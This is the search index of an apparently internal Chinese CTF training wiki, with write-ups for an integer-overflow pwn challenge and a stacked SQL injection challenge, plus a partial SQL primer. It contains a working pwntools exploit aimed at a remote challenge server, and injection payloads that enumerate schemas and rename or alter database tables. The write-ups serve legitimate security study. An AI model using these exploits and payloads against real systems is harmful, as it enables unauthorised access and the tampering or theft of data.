{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u6b22\u8fce\u6765\u5230zero4fun's wiki \u5185\u90e8\u6d4b\u8bd5\uff0c\u8bf7\u52ff\u6269\u6563\uff01 \u7b80\u5355\u521b\u5efa\u7684\u6837\u677f\u5927\u5bb6\u770b\u770b\u662f\u5426\u5408\u9002\u3002 \u7b80\u4ecb\uff1a \u4f8b\u9898\uff1a\u5178\u578b\u4f8b\u9898 \u9898\u578b\uff1a\u5305\u542b\u9898\u578b\u3001\u7279\u5f81\u8bc6\u522b\u3001\u89e3\u9898\u65b9\u6cd5\u548c\u5229\u7528\u811a\u672c\u3001\u8003\u70b9\u4e0e\u4e13\u4e1a\u77e5\u8bc6\u70b9\uff08\u6309\u9898\u578b\u6765\uff09 \u76f8\u5173\u77e5\u8bc6\uff1a\u975e\u4e13\u4e1a\u6027\u7684\u57fa\u7840\u77e5\u8bc6\u70b9 \u5de5\u5177\uff1a\u5229\u7528\u811a\u672c\u51fd\u6570\u5e93\u548c\u5de5\u5177\u5e93 FAQ\uff1a\u95ee\u7b54\uff0c\u4f7f\u7528\u624b\u518c","title":"\u7b80\u4ecb"},{"location":"#zero4funs-wiki","text":"\u5185\u90e8\u6d4b\u8bd5\uff0c\u8bf7\u52ff\u6269\u6563\uff01 \u7b80\u5355\u521b\u5efa\u7684\u6837\u677f\u5927\u5bb6\u770b\u770b\u662f\u5426\u5408\u9002\u3002 \u7b80\u4ecb\uff1a \u4f8b\u9898\uff1a\u5178\u578b\u4f8b\u9898 \u9898\u578b\uff1a\u5305\u542b\u9898\u578b\u3001\u7279\u5f81\u8bc6\u522b\u3001\u89e3\u9898\u65b9\u6cd5\u548c\u5229\u7528\u811a\u672c\u3001\u8003\u70b9\u4e0e\u4e13\u4e1a\u77e5\u8bc6\u70b9\uff08\u6309\u9898\u578b\u6765\uff09 \u76f8\u5173\u77e5\u8bc6\uff1a\u975e\u4e13\u4e1a\u6027\u7684\u57fa\u7840\u77e5\u8bc6\u70b9 \u5de5\u5177\uff1a\u5229\u7528\u811a\u672c\u51fd\u6570\u5e93\u548c\u5de5\u5177\u5e93 FAQ\uff1a\u95ee\u7b54\uff0c\u4f7f\u7528\u624b\u518c","title":"\u6b22\u8fce\u6765\u5230zero4fun's wiki"},{"location":"FAQ/FAQ/","text":"FAQ \u5f85\u8865\u5145\u3002\u3002\u3002","title":"FAQ"},{"location":"FAQ/FAQ/#faq","text":"\u5f85\u8865\u5145\u3002\u3002\u3002","title":"FAQ"},{"location":"Instance/pwn/integer_overflow/int_overflow/","text":"int_overflow \u4e00\u3001\u5ba1\u9898 \u4e8c\u3001\u89e3\u9898\u601d\u8def 1\u3001\u8003\u70b9\u4e3a\u6574\u6570\u6ea2\u51fa\uff0c\u5148checksec\u770b\u770b\u4fdd\u62a4\u60c5\u51b5\uff0c32\u4f4d\uff0cgot\u8868\u53ef\u5199\uff0c\u6ca1\u6709\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5806\u6808\u4e0d\u53ef\u6267\u884c\uff0c\u4ee3\u7801\u6bb5\u52a0\u8f7d\u5730\u5740\u56fa\u5b9a\uff1b 2\u3001\u4f7f\u7528ida\u6253\u5f00\u7a0b\u5e8f\uff0c\u67e5\u770b\u4f2a\u4ee3\u7801\uff0cmain\u51fd\u6570\u4e2d\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd\uff0cexit\u4e0d\u7528\u770b\uff0c\u91cd\u70b9\u770blogin\uff0c\u5728login\u51fd\u6570\u4e2d\u9700\u8981\u8f93\u5165username\uff08\u6700\u957f0x19\uff09\u548cpassword\uff08\u6700\u957f0x199\uff09\uff0c\u6b64\u5904\u4e0d\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u518d\u8fdb\u4e00\u6b65\u770bcheck_passwd\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u70b9\uff0c\u5982\u4e0b\u56fe\uff0cv3\u53d8\u91cf\u7684\u7c7b\u578b\u4e3aunsigned __int8\uff0c\u53ea\u6709\u4e00\u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u4f46\u662fs\u6570\u7ec4\u7684\u957f\u5ea6\u6700\u957f\u53ef\u8fbe0x199\uff0c\u53ea\u9700\u8981\u6ee1\u8db3\u6700\u540e\u4e00\u5b57\u8282\u57284~8\u4e4b\u95f4\u5373\u53ef\uff0c\u8fd9\u91cc\u4e3b\u8981\u662f\u5927\u5230\u5c0f\u7684\u7c7b\u578b\u8f6c\u6362\u51fa\u73b0\u622a\u65ad\uff0c\u5e76\u4e14dest\u53d8\u91cf\u7684\u957f\u5ea6\u53ea\u670910\u5b57\u8282\uff0c\u53ef\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff1b 3\u3001\u67e5\u770b\u5b58\u5728system\u8bed\u53e5\uff0c\u5982\u4e0b\u56fe\uff0c\u76f4\u63a5\u5c06\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u6b64\u51fd\u6570\u5730\u5740\u5373\u53ef\uff1b 4\u3001exp\u5982\u4e0b\uff1a from pwn import * s = remote('220.249.52.133', 48307) r_addr = 0x0804868B payload = 'a'*0x18 + p32(r_addr) + 'a'*(0x104-0x18-0x4) s.sendlineafter('Your choice:','1') s.sendlineafter('Please input your username:','aaa') s.recvuntil('Please input your passwd:') s.sendline(payload) s.interactive() \u7ed3\u679c\u5982\u4e0b\uff1a","title":"int_overflow"},{"location":"Instance/pwn/integer_overflow/int_overflow/#int_overflow","text":"","title":"int_overflow"},{"location":"Instance/pwn/integer_overflow/int_overflow/#_1","text":"","title":"\u4e00\u3001\u5ba1\u9898"},{"location":"Instance/pwn/integer_overflow/int_overflow/#_2","text":"1\u3001\u8003\u70b9\u4e3a\u6574\u6570\u6ea2\u51fa\uff0c\u5148checksec\u770b\u770b\u4fdd\u62a4\u60c5\u51b5\uff0c32\u4f4d\uff0cgot\u8868\u53ef\u5199\uff0c\u6ca1\u6709\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5806\u6808\u4e0d\u53ef\u6267\u884c\uff0c\u4ee3\u7801\u6bb5\u52a0\u8f7d\u5730\u5740\u56fa\u5b9a\uff1b 2\u3001\u4f7f\u7528ida\u6253\u5f00\u7a0b\u5e8f\uff0c\u67e5\u770b\u4f2a\u4ee3\u7801\uff0cmain\u51fd\u6570\u4e2d\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd\uff0cexit\u4e0d\u7528\u770b\uff0c\u91cd\u70b9\u770blogin\uff0c\u5728login\u51fd\u6570\u4e2d\u9700\u8981\u8f93\u5165username\uff08\u6700\u957f0x19\uff09\u548cpassword\uff08\u6700\u957f0x199\uff09\uff0c\u6b64\u5904\u4e0d\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u518d\u8fdb\u4e00\u6b65\u770bcheck_passwd\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u70b9\uff0c\u5982\u4e0b\u56fe\uff0cv3\u53d8\u91cf\u7684\u7c7b\u578b\u4e3aunsigned __int8\uff0c\u53ea\u6709\u4e00\u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u4f46\u662fs\u6570\u7ec4\u7684\u957f\u5ea6\u6700\u957f\u53ef\u8fbe0x199\uff0c\u53ea\u9700\u8981\u6ee1\u8db3\u6700\u540e\u4e00\u5b57\u8282\u57284~8\u4e4b\u95f4\u5373\u53ef\uff0c\u8fd9\u91cc\u4e3b\u8981\u662f\u5927\u5230\u5c0f\u7684\u7c7b\u578b\u8f6c\u6362\u51fa\u73b0\u622a\u65ad\uff0c\u5e76\u4e14dest\u53d8\u91cf\u7684\u957f\u5ea6\u53ea\u670910\u5b57\u8282\uff0c\u53ef\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff1b 3\u3001\u67e5\u770b\u5b58\u5728system\u8bed\u53e5\uff0c\u5982\u4e0b\u56fe\uff0c\u76f4\u63a5\u5c06\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u6b64\u51fd\u6570\u5730\u5740\u5373\u53ef\uff1b 4\u3001exp\u5982\u4e0b\uff1a from pwn import * s = remote('220.249.52.133', 48307) r_addr = 0x0804868B payload = 'a'*0x18 + p32(r_addr) + 'a'*(0x104-0x18-0x4) s.sendlineafter('Your choice:','1') s.sendlineafter('Please input your username:','aaa') s.recvuntil('Please input your passwd:') s.sendline(payload) s.interactive() \u7ed3\u679c\u5982\u4e0b\uff1a","title":"\u4e8c\u3001\u89e3\u9898\u601d\u8def"},{"location":"Instance/web/sql_inject/supersqli/","text":"supersqli \u4e00\u3001\u5ba1\u9898 \u4e8c\u3001\u89e3\u9898\u601d\u8def 1\u3001\u8003\u70b9\u4e3a\u5806\u53e0\u6ce8\u5165\uff0c\u901a\u5e38\u6765\u8bf4\u6570\u636e\u5e93\u6bcf\u6b21\u6267\u884c\u4e00\u6761\u6307\u4ee4\uff0c\u4f46\u5806\u53e0\u6ce8\u5165\u662f\u4f8b\u5916\uff0c\u5728\u539f\u8bed\u53e5\u540e\u52a0\u4e0a\u5206\u53f7\uff0c\u591a\u6761\u8bed\u53e5\u53ef\u4ee5\u4e00\u6b21\u6267\u884c\uff0c\u4f46\u5176\u4f7f\u7528\u573a\u666f\u6709\u9650\uff0c\u53d7API\u3001\u6570\u636e\u5e93\u5f15\u64ce\u3001\u6743\u9650\u7b49\u9650\u5236\uff0c\u4f8b\u5982\u5229\u7528mysqli_multi_query()\u51fd\u6570\u5c31\u652f\u6301\u591a\u6761sql\u8bed\u53e5\u540c\u65f6\u6267\u884c\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u5982PHP\u4e3a\u4e86\u9632\u6b62sql\u6ce8\u5165\u673a\u5236\uff0c\u5f80\u5f80\u4f7f\u7528\u8c03\u7528\u6570\u636e\u5e93\u7684\u51fd\u6570\u662fmysqli_ query()\u51fd\u6570\uff0c\u5176\u53ea\u80fd\u6267\u884c\u4e00\u6761\u8bed\u53e5\uff0c\u5206\u53f7\u540e\u9762\u7684\u5185\u5bb9\u5c06\u4e0d\u4f1a\u88ab\u6267\u884c\uff1b 2\u3001\u89c2\u5bdf\u9898\u76ee\uff0c\u53d1\u73b0\u9898\u76ee\u4e2d\u76f4\u63a5\u7ed9\u4e86\u4e00\u4e2a\u6ce8\u5165\u6846\uff0c\u9ed8\u8ba4\u67e5\u8be2\u4e3a inject=1 \uff0c\u9996\u5148\u5c1d\u8bd5\u95ed\u5408\u6761\u4ef6\uff0c\u53d1\u73b0\u4f7f\u7528\u5355\u5f15\u53f7 ' \u65f6\u62a5\u9519\uff1b 3\u3001\u5c1d\u8bd5\u4f7f\u7528 order by \u6216 group by \u7206\u7834\u51fa\u5f53\u524d\u67e5\u8be2\u7684\u5217\u6570\uff0c\u5728\u5c1d\u8bd5\u8fc7\u7a0b\u4e2d\u9700\u8981\u5c06\u5176\u540e\u7684\u5355\u5f15\u53f7\u6ce8\u91ca\u6389\uff0c\u9996\u5148\u5c1d\u8bd5 -- \u6ce8\u91ca\uff0c\u53d1\u73b0\u88ab\u8fc7\u6ee4\uff0c\u518d\u5c1d\u8bd5 # \u6ce8\u91ca\uff0c\u53ef\u884c\uff0c\u5e76\u7206\u7834\u51fa\u5f53\u524d\u67e5\u8be2\u5217\u6570\u4e3a2\uff0c\u56e0\u4e3a\u4e00\u76f4\u52303\u7684\u65f6\u5019\u62a5\u9519\u4e86\uff1b 4\u3001\u5c1d\u8bd5\u4f7f\u7528 union select \u7206\u7834\u6570\u636e\u5e93\u4fe1\u606f\uff0c\u4f46\u662f\u53d1\u73b0\u6709waf\uff1b -- \u67e5\u8be2\u5e93\u540d ' union select 1,group_concat(schema_name) from information_schema.schemata# /* \u51e0\u70b9\u89e3\u91ca \u4e3a\u4ec0\u4e48\u662fgroup_concat(schema_name)\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u4e00\u884c\u663e\u793a\uff0c\u6240\u6709\u7528\u8be5\u51fd\u6570\u62fc\u63a5\u7ed3\u679c\uff1b \u4e3a\u4ec0\u4e48\u662f 1,group_concat(schema_name)\uff0c\u56e0\u4e3aunion\u67e5\u8be2\u7684\u7279\u6b8a\u6027\uff0c\u6bcf\u4e2a SELECT \u8bed\u53e5\u5fc5\u987b\u62e5\u6709\u76f8\u540c\u6570\u91cf\u7684\u5217\uff0c\u5217\u4e5f\u5fc5\u987b\u62e5\u6709\u76f8\u4f3c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u540c\u65f6\uff0c\u6bcf\u4e2a SELECT \u8bed\u53e5\u4e2d\u7684\u5217\u7684\u987a\u5e8f\u5fc5\u987b\u76f8\u540c\uff0c\u6240\u4ee5\u9700\u8981\u627e\u4e00\u4e2a\u5b57\u7b26\u4e32\u578b\u7684\u5217\u8fdb\u884c\u8054\u5408\u67e5\u8be2 */ -- \u67e5\u8be2\u8868\u540d ' union select 1,group_concat(table_name) from information_schema.tables where table_schema='\u5e93\u540d'# -- \u67e5\u8be2\u5217\u540d ' union select 1,group_concat(column_name) from information_schema.columns where table_name='\u8868\u540d'# -- \u67e5\u8be2\u5217\u5185\u5bb9 ' union select 1,group_concat(\u5217\u540d) from \u5217\u540d# 5\u3001\u6ce8\u610f\u5230select\u5173\u952e\u5b57\u88ab\u8fc7\u6ee4\u540e\uff0c\u53ef\u4ee5\u8003\u8651\u7ed5\u8fc7\u6216\u8005\u5c1d\u8bd5\u5806\u53e0\u6ce8\u5165\uff0c\u6b64\u5904\u4e3a\u5806\u53e0\u6ce8\u5165\uff1b 6\u3001\u4f7f\u7528show\u547d\u4ee4\u67e5\u770b\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u540d\uff1b 1';show databases;# -- \u67e5\u770b\u5e93\u540d\u7684\u547d\u4ee4 -- \u7ed3\u679c\u6709\u516d\u4e2a\uff0c\u5206\u522b\u4e3actftraining\uff0cinformation_schema\uff0cmysql\uff0cperformance_schema\uff0csupersqli\uff0ctest 1';show tables;# -- \u67e5\u770b\u5f53\u524d\u5e93\u7684\u8868\u540d\u7684\u547d\u4ee4 -- \u7ed3\u679c\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u4e3a1919810931114514\uff0cwords 1';show columns from words;# -- \u67e5\u770bwords\u8868\u4e2d\u7684\u5217 -- \u7ed3\u679c\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u4e3aint(10)\u578b\u7684id\uff0cvarchar(20)\u578b\u7684data 1';show columns from `1919810931114514`;# -- \u67e5\u770b1919810931114514\u8868\u4e2d\u7684\u5217\uff0c\u5b57\u7b26\u4e32\u4e3a\u8868\u540d\u6216\u5b57\u6bb5\u540d\u64cd\u4f5c\u65f6\u8981\u52a0\u53cd\u5f15\u53f7\uff0c\u8fd9\u4e2a\u89e3\u91ca\u4e0d\u5b8c\u6574\uff0c\u5f53\u5b57\u7b26\u4e32\u4e3a\u8868\u540d\u65f6\uff0c\u5982\u679c\u662f\u4fdd\u7559\u5b57\u6216\u8005\u65e0\u6cd5\u89e3\u91ca\u65f6\uff0c\u52a0\u4e0a\u53cd\u5f15\u53f7\u5c31\u80fd\u88ab\u4f5c\u4e3a\u8868\u540d\u6216\u5b57\u6bb5\u540d\uff0c\u5982\u679c\u53ea\u662f\u6b63\u5e38\u7684\u5b57\u7b26\u4e32\u53ef\u4ee5\u4e0d\u52a0\u53cd\u5f15\u53f7 -- \u7ed3\u679c\u4e3avarchar(100)\u578b\u7684flag 7\u3001\u7531\u4e0a\u9762\u5bf9\u8868\u4e2d\u5217\u7684\u67e5\u8be2\u7ed3\u679c\u53ef\u77e5\uff0c\u5f53\u524d\u64cd\u4f5c\u7684\u8868\u4e3awords\uff0c\u800c\u9700\u8981\u7684flag\u57281919810931114514\u8868\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528rename\u548calter\u6765\u5bf91919810931114514\u8868\u8fdb\u884c\u64cd\u4f5c\uff0crename\u66f4\u6539\u8868\u540d\uff0calter\u66f4\u6539\u8868\u4e2d\u7684\u5217\uff1b -- \u5c06words\u8868\u91cd\u547d\u540d\u4e3aword -- \u5c061919810931114514\u8868\u91cd\u547d\u540d\u4e3awords -- \u5c061919810931114514\u8868\u4e2d\u7684flag\u5b57\u6bb5\u91cd\u547d\u540d\u4e3aid 1';rename tables `words` to `word`;rename tables `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);# -- \u7279\u522b\u6ce8\u610f\uff0c\u4e0d\u80fd\u5c06\u8fd9\u524d\u4e24\u53e5\u5206\u5f00\u6267\u884c\uff0c\u56e0\u4e3a\u6267\u884c\u7b2c\u4e00\u53e5\u540e\uff0cwords\u8868\u5c31\u6ca1\u4e86\uff0c\u65e0\u6cd5\u6267\u884c\u5806\u53e0\u67e5\u8be2 -- \u6700\u540e\u4e5f\u53ef\u4ee5\u5411\u8868\u4e2d\u52a0\u5165id\u5217 1';rename tables `words` to `word`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);# 8\u3001\u6b64\u65f6\u518d\u4f7f\u7528 1' or 1=1# \uff0c\u8fdb\u884c\u4e3a\u771f\u67e5\u8be2\u5c31\u80fd\u591f\u8fd4\u56de\u6700\u7ec8\u7ed3\u679c\uff0c\u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u9700\u8981\u8fd9\u6837\u505a\uff0c\u6709\u4e86\u8fd9\u4e2a\u76f8\u5f53\u4e8ewhere\u6761\u4ef6\u4e00\u5b9a\u4e3a\u771f\uff0c\u76f8\u5f53\u4e8e\u6ca1\u6709where\u5b50\u53e5\uff0c\u7b49\u4ef7\u4e8e\u76f4\u63a5\u6267\u884cselect * from table\uff1b","title":"supersqli"},{"location":"Instance/web/sql_inject/supersqli/#supersqli","text":"","title":"supersqli"},{"location":"Instance/web/sql_inject/supersqli/#_1","text":"","title":"\u4e00\u3001\u5ba1\u9898"},{"location":"Instance/web/sql_inject/supersqli/#_2","text":"1\u3001\u8003\u70b9\u4e3a\u5806\u53e0\u6ce8\u5165\uff0c\u901a\u5e38\u6765\u8bf4\u6570\u636e\u5e93\u6bcf\u6b21\u6267\u884c\u4e00\u6761\u6307\u4ee4\uff0c\u4f46\u5806\u53e0\u6ce8\u5165\u662f\u4f8b\u5916\uff0c\u5728\u539f\u8bed\u53e5\u540e\u52a0\u4e0a\u5206\u53f7\uff0c\u591a\u6761\u8bed\u53e5\u53ef\u4ee5\u4e00\u6b21\u6267\u884c\uff0c\u4f46\u5176\u4f7f\u7528\u573a\u666f\u6709\u9650\uff0c\u53d7API\u3001\u6570\u636e\u5e93\u5f15\u64ce\u3001\u6743\u9650\u7b49\u9650\u5236\uff0c\u4f8b\u5982\u5229\u7528mysqli_multi_query()\u51fd\u6570\u5c31\u652f\u6301\u591a\u6761sql\u8bed\u53e5\u540c\u65f6\u6267\u884c\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u5982PHP\u4e3a\u4e86\u9632\u6b62sql\u6ce8\u5165\u673a\u5236\uff0c\u5f80\u5f80\u4f7f\u7528\u8c03\u7528\u6570\u636e\u5e93\u7684\u51fd\u6570\u662fmysqli_ query()\u51fd\u6570\uff0c\u5176\u53ea\u80fd\u6267\u884c\u4e00\u6761\u8bed\u53e5\uff0c\u5206\u53f7\u540e\u9762\u7684\u5185\u5bb9\u5c06\u4e0d\u4f1a\u88ab\u6267\u884c\uff1b 2\u3001\u89c2\u5bdf\u9898\u76ee\uff0c\u53d1\u73b0\u9898\u76ee\u4e2d\u76f4\u63a5\u7ed9\u4e86\u4e00\u4e2a\u6ce8\u5165\u6846\uff0c\u9ed8\u8ba4\u67e5\u8be2\u4e3a inject=1 \uff0c\u9996\u5148\u5c1d\u8bd5\u95ed\u5408\u6761\u4ef6\uff0c\u53d1\u73b0\u4f7f\u7528\u5355\u5f15\u53f7 ' \u65f6\u62a5\u9519\uff1b 3\u3001\u5c1d\u8bd5\u4f7f\u7528 order by \u6216 group by \u7206\u7834\u51fa\u5f53\u524d\u67e5\u8be2\u7684\u5217\u6570\uff0c\u5728\u5c1d\u8bd5\u8fc7\u7a0b\u4e2d\u9700\u8981\u5c06\u5176\u540e\u7684\u5355\u5f15\u53f7\u6ce8\u91ca\u6389\uff0c\u9996\u5148\u5c1d\u8bd5 -- \u6ce8\u91ca\uff0c\u53d1\u73b0\u88ab\u8fc7\u6ee4\uff0c\u518d\u5c1d\u8bd5 # \u6ce8\u91ca\uff0c\u53ef\u884c\uff0c\u5e76\u7206\u7834\u51fa\u5f53\u524d\u67e5\u8be2\u5217\u6570\u4e3a2\uff0c\u56e0\u4e3a\u4e00\u76f4\u52303\u7684\u65f6\u5019\u62a5\u9519\u4e86\uff1b 4\u3001\u5c1d\u8bd5\u4f7f\u7528 union select \u7206\u7834\u6570\u636e\u5e93\u4fe1\u606f\uff0c\u4f46\u662f\u53d1\u73b0\u6709waf\uff1b -- \u67e5\u8be2\u5e93\u540d ' union select 1,group_concat(schema_name) from information_schema.schemata# /* \u51e0\u70b9\u89e3\u91ca \u4e3a\u4ec0\u4e48\u662fgroup_concat(schema_name)\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u4e00\u884c\u663e\u793a\uff0c\u6240\u6709\u7528\u8be5\u51fd\u6570\u62fc\u63a5\u7ed3\u679c\uff1b \u4e3a\u4ec0\u4e48\u662f 1,group_concat(schema_name)\uff0c\u56e0\u4e3aunion\u67e5\u8be2\u7684\u7279\u6b8a\u6027\uff0c\u6bcf\u4e2a SELECT \u8bed\u53e5\u5fc5\u987b\u62e5\u6709\u76f8\u540c\u6570\u91cf\u7684\u5217\uff0c\u5217\u4e5f\u5fc5\u987b\u62e5\u6709\u76f8\u4f3c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u540c\u65f6\uff0c\u6bcf\u4e2a SELECT \u8bed\u53e5\u4e2d\u7684\u5217\u7684\u987a\u5e8f\u5fc5\u987b\u76f8\u540c\uff0c\u6240\u4ee5\u9700\u8981\u627e\u4e00\u4e2a\u5b57\u7b26\u4e32\u578b\u7684\u5217\u8fdb\u884c\u8054\u5408\u67e5\u8be2 */ -- \u67e5\u8be2\u8868\u540d ' union select 1,group_concat(table_name) from information_schema.tables where table_schema='\u5e93\u540d'# -- \u67e5\u8be2\u5217\u540d ' union select 1,group_concat(column_name) from information_schema.columns where table_name='\u8868\u540d'# -- \u67e5\u8be2\u5217\u5185\u5bb9 ' union select 1,group_concat(\u5217\u540d) from \u5217\u540d# 5\u3001\u6ce8\u610f\u5230select\u5173\u952e\u5b57\u88ab\u8fc7\u6ee4\u540e\uff0c\u53ef\u4ee5\u8003\u8651\u7ed5\u8fc7\u6216\u8005\u5c1d\u8bd5\u5806\u53e0\u6ce8\u5165\uff0c\u6b64\u5904\u4e3a\u5806\u53e0\u6ce8\u5165\uff1b 6\u3001\u4f7f\u7528show\u547d\u4ee4\u67e5\u770b\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u540d\uff1b 1';show databases;# -- \u67e5\u770b\u5e93\u540d\u7684\u547d\u4ee4 -- \u7ed3\u679c\u6709\u516d\u4e2a\uff0c\u5206\u522b\u4e3actftraining\uff0cinformation_schema\uff0cmysql\uff0cperformance_schema\uff0csupersqli\uff0ctest 1';show tables;# -- \u67e5\u770b\u5f53\u524d\u5e93\u7684\u8868\u540d\u7684\u547d\u4ee4 -- \u7ed3\u679c\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u4e3a1919810931114514\uff0cwords 1';show columns from words;# -- \u67e5\u770bwords\u8868\u4e2d\u7684\u5217 -- \u7ed3\u679c\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u4e3aint(10)\u578b\u7684id\uff0cvarchar(20)\u578b\u7684data 1';show columns from `1919810931114514`;# -- \u67e5\u770b1919810931114514\u8868\u4e2d\u7684\u5217\uff0c\u5b57\u7b26\u4e32\u4e3a\u8868\u540d\u6216\u5b57\u6bb5\u540d\u64cd\u4f5c\u65f6\u8981\u52a0\u53cd\u5f15\u53f7\uff0c\u8fd9\u4e2a\u89e3\u91ca\u4e0d\u5b8c\u6574\uff0c\u5f53\u5b57\u7b26\u4e32\u4e3a\u8868\u540d\u65f6\uff0c\u5982\u679c\u662f\u4fdd\u7559\u5b57\u6216\u8005\u65e0\u6cd5\u89e3\u91ca\u65f6\uff0c\u52a0\u4e0a\u53cd\u5f15\u53f7\u5c31\u80fd\u88ab\u4f5c\u4e3a\u8868\u540d\u6216\u5b57\u6bb5\u540d\uff0c\u5982\u679c\u53ea\u662f\u6b63\u5e38\u7684\u5b57\u7b26\u4e32\u53ef\u4ee5\u4e0d\u52a0\u53cd\u5f15\u53f7 -- \u7ed3\u679c\u4e3avarchar(100)\u578b\u7684flag 7\u3001\u7531\u4e0a\u9762\u5bf9\u8868\u4e2d\u5217\u7684\u67e5\u8be2\u7ed3\u679c\u53ef\u77e5\uff0c\u5f53\u524d\u64cd\u4f5c\u7684\u8868\u4e3awords\uff0c\u800c\u9700\u8981\u7684flag\u57281919810931114514\u8868\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528rename\u548calter\u6765\u5bf91919810931114514\u8868\u8fdb\u884c\u64cd\u4f5c\uff0crename\u66f4\u6539\u8868\u540d\uff0calter\u66f4\u6539\u8868\u4e2d\u7684\u5217\uff1b -- \u5c06words\u8868\u91cd\u547d\u540d\u4e3aword -- \u5c061919810931114514\u8868\u91cd\u547d\u540d\u4e3awords -- \u5c061919810931114514\u8868\u4e2d\u7684flag\u5b57\u6bb5\u91cd\u547d\u540d\u4e3aid 1';rename tables `words` to `word`;rename tables `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);# -- \u7279\u522b\u6ce8\u610f\uff0c\u4e0d\u80fd\u5c06\u8fd9\u524d\u4e24\u53e5\u5206\u5f00\u6267\u884c\uff0c\u56e0\u4e3a\u6267\u884c\u7b2c\u4e00\u53e5\u540e\uff0cwords\u8868\u5c31\u6ca1\u4e86\uff0c\u65e0\u6cd5\u6267\u884c\u5806\u53e0\u67e5\u8be2 -- \u6700\u540e\u4e5f\u53ef\u4ee5\u5411\u8868\u4e2d\u52a0\u5165id\u5217 1';rename tables `words` to `word`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);# 8\u3001\u6b64\u65f6\u518d\u4f7f\u7528 1' or 1=1# \uff0c\u8fdb\u884c\u4e3a\u771f\u67e5\u8be2\u5c31\u80fd\u591f\u8fd4\u56de\u6700\u7ec8\u7ed3\u679c\uff0c\u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u9700\u8981\u8fd9\u6837\u505a\uff0c\u6709\u4e86\u8fd9\u4e2a\u76f8\u5f53\u4e8ewhere\u6761\u4ef6\u4e00\u5b9a\u4e3a\u771f\uff0c\u76f8\u5f53\u4e8e\u6ca1\u6709where\u5b50\u53e5\uff0c\u7b49\u4ef7\u4e8e\u76f4\u63a5\u6267\u884cselect * from table\uff1b","title":"\u4e8c\u3001\u89e3\u9898\u601d\u8def"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/","text":"SQL SQL\uff08Structured Query Language\uff09\uff0c\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\uff0c\u7528\u4e8e\u8bbf\u95ee\u548c\u5904\u7406\u6570\u636e\u5e93\u7684\u6807\u51c6\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002 \u9664\u4e86 SQL \u6807\u51c6\u4e4b\u5916\uff0c\u5927\u90e8\u5206 SQL \u6570\u636e\u5e93\u7a0b\u5e8f\u90fd\u62e5\u6709\u5b83\u4eec\u81ea\u5df1\u7684\u4e13\u6709\u6269\u5c55\uff01 \u4e00\u3001\u57fa\u672c\u8bed\u6cd5 1\u3001SQL\u5bf9\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff1b 2\u3001\u67d0\u4e9b\u6570\u636e\u5e93\u8981\u6c42\u6bcf\u6761\u8bed\u53e5\u4f7f\u7528\u5206\u53f7\u95f4\u9694\uff1b 3\u3001\u4e00\u4e9b\u91cd\u8981\u7684SQL\u547d\u4ee4\uff1a \u547d\u4ee4 \u63cf\u8ff0 SELECT \u4ece\u6570\u636e\u5e93\u4e2d\u63d0\u53d6\u6570\u636e UPDATE \u66f4\u65b0\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e DELETE \u4ece\u6570\u636e\u5e93\u4e2d\u5220\u9664\u6570\u636e INSERT INTO \u5411\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u65b0\u6570\u636e CREATE DATABASE \u521b\u5efa\u65b0\u6570\u636e\u5e93 ALTER DATABASE \u4fee\u6539\u6570\u636e\u5e93 CREATE TABLE \u521b\u5efa\u65b0\u8868 ALTER TABLE \u53d8\u66f4\uff08\u6539\u53d8\uff09\u6570\u636e\u5e93\u8868 DROP TABLE \u5220\u9664\u8868 CREATE INDEX \u521b\u5efa\u7d22\u5f15\uff08\u641c\u7d22\u952e\uff09 DROP INDEX \u5220\u9664\u7d22\u5f15 4\u3001\u6ce8\u91ca\uff0c\u5355\u884c\u4e00\u822c\u4f7f\u7528 -- \uff0c\u591a\u884c\u4f7f\u7528 /**/ \uff0cMySQL\u8fd8\u53ef\u4f7f\u7528 # \u8fdb\u884c\u5355\u884c\u6ce8\u91ca\u3002 \u4e8c\u3001\u8bed\u53e5\u8be6\u89e3 1\u3001SELECT \uff081\uff09SELECT 